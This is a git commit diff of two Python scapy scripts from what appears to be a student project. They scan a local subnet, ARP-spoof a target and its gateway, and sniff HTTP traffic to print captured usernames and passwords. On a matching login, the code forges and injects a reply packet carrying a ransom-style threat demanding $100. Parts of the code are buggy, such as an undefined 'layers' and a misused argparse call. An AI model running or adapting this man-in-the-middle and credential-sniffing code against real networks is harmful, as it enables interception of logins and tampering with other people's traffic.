1c13e31b1d1eb12899070ef76459b3ca97ed59af
BoyBen <boyben001@gmail.com>
2022-01-05 01:48:49 +0800

    Final version of ARP Spoofing & modify packet

--- main.py
+++ main.py
@@ -1,7 +1,47 @@
 import scapy.all as scapy
 import time
+import argparse
+from scapy_http import http
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
+gateway_ip = "192.168.0.1" 
+target_ip = "192.168.0.105"
+
+#   Scan.py
+def get_argments():
+    parser = argparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target",
+    help="Target IP / IP range") #當使用者在終端機執行 python3 main.py -target gateway_ip/24，期望在終端機看到輸出看到IP range。
+    options = parser.parse_args() #解析使用者輸入的值
+    return options
+
+def scan(ip):
+    #Create ARP request directed to broadcast MAC asking for IP#
+    arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #利用scapy模組的Ether物件
+    arp_request_broadcast = broadcast/arp_request  #把arp_request跟broadcast混合，發送此混合封包，然後它會自動送到廣播的MAC address，去詢問我們想知道的IP位址
+    #----------------------------------------------------------#
+    
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  #Send packet and receive response
+    
+    client_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        client_list.append(client_dict)
+    return client_list  
+    
+    
+def print_result(list):   #Parse the response
+    print("IP\t\t\tMAC Address\n-----------------------------------------")
+    for client in list:
+        print(client["ip"] + "\t\t" + client["mac"])
+#   =============================================================              
+      
+        
+
+#   Spoofing
 def get_mac(ip):
     #Create ARP request directed to broadcast MAC asking for IP#
     arp_request = scapy.ARP(pdst=ip)  #only need for IP Field
@@ -27,18 +67,26 @@ def restore(destination_ip, source_ip):
                             psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
     
-def action(packet):
-   # pakt[iter]=packet
-    #print(pakt[iter])
-    
-    print("7")
-    print(packet.src)
-    print(packet.getlayer(scapy.packet.Raw).load)
-    
-target_ip = "192.168.206.143"
-gateway_ip = "192.168.146.236"
-get_mac(gateway_ip)
 
+#   =============================================================    
+
+
+#   start interface
+# print("Enter the IPv4 Address of the route: ", end='')
+# route_ip = input()
+
+# ===================================================
+#   display all the subnetwork of the gateway
+
+count = 5
+while (count > 0):
+    scan_result = scan("192.168.0.1/24")    #可拿到所有子網路的封包回應
+    print_result(scan_result)
+    count-=1
+
+# ===================================================
+
+#   choose the victim and spoofing
 try:
     sent_packets_count = 0
     while True:
@@ -46,13 +94,14 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)  # Waits for two seconds
+        time.sleep(0.1)  # Waits for two seconds
+    
        
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
     restore(gateway_ip, target_ip)
     restore(target_ip, gateway_ip)
     print("[+] Arp Spoof Stopped")
-
+# ====================================================
 
     
--- sniff.py
+++ sniff.py
@@ -1,10 +1,14 @@
 import scapy.all as scapy
+from scapy import *
+from scapy.interfaces import IFACES
 from scapy_http import http
 
-def sniff(interface):
+def sniff():
     # print("vsvs")
-    scapy.sniff(iface=interface, store=False,
-                prn=process_sniffed_packet)
+    # scapy.sniff(store=False,
+    #             prn=process_sniffed_packet)
+    scapy.sniff(store=False,
+                prn=n_process)
 
 def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
@@ -22,6 +26,8 @@ def get_login_info(packet):
 
 
 def process_sniffed_packet(packet):
+    # print("sucess")
+    # print(packet.src)
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> " + url.decode("utf-8"))
@@ -33,22 +39,66 @@ def process_sniffed_packet(packet):
                   + login_info.decode()
                   + "\n\n")
             if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
-                print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
-                arp_request = scapy.ARP(pdst = "192.168.206.1")
-                broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-                ippkt = scapy.IP(dst="192.168.206.101",ttl=10)
-                tcp = scapy.TCP(sport=8888, dport=80)
-                payload="stfu2"
-                arp_request_broadcast = broadcast / arp_request/ippkt/tcp/payload
+                packet.show()
                 
-                print(arp_request_broadcast.payload.layers())
+                #print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
+                print("in")
+               # packet.getlayer(1).hwsrc='5'
+                
+                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
+                xPayload = nPayload.encode('utf-8')
+                nPayload =""
+                packet.getlayer(scapy.packet.Raw).load=xPayload
+                # print(packet.getlayer(layers.l2.Ethernet).src)
+                print(packet.getlayer(scapy.packet.Raw).load)
+
+                buffIpdst = packet.getlayer(scapy.IP).dst
+                buffIpsrc = packet.getlayer(scapy.IP).src
+                buffEthdst = packet.getlayer(layers.l2.Ether).dst
+                buffEthsrc = packet.getlayer(layers.l2.Ether).src
+
+                packet.getlayer(scapy.IP).dst = buffIpsrc.encode('utf-8')
+                packet.getlayer(scapy.IP).src = buffIpdst.encode('utf-8')
+                packet.getlayer(layers.l2.Ether).dst = buffEthsrc.encode('utf-8')
+                packet.getlayer(layers.l2.Ether).src = buffEthdst.encode('utf-8')
+                packet.show()   
+
+        
+                scapy.send(packet)
+                packet.show()
+                #print(arp_request_broadcast.payload.layers())
                 #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
                 #rawPayload = arp_request_broadcast.layers()
-                arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
-                rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
+                #arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
+                #rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
+                #print(rawPayload)
 
-                print(rawPayload)
+def n_process(packet):
+    
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url.decode("utf-8"))
 
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > "
+                  + login_info.decode()
+                  + "\n\n")
+            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
+                print("in")
+                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
+                buffIpdst = packet.getlayer(scapy.IP).dst
+                buffIpsrc = packet.getlayer(scapy.IP).src
+                buffEthdst = packet.getlayer(layers.l2.Ether).dst
+                buffEthsrc = packet.getlayer(layers.l2.Ether).src
 
+                nEth = scapy.Ether(buffEthsrc) 
+                nIp = scapy.IP(src =buffIpdst ,dst=buffIpsrc,ttl=10)
+                nTcp=scapy.TCP(sport=8888,dport=88)
+                nPayload="You suck got hacked!!!"
+                nPkt=nEth/nIp/nTcp/nPayload
+                print(packet.getlayer(scapy.IP).dst)
+                nPkt.show()
+                scapy.send(nPkt)
 
-sniff("enp0s3")
+sniff()
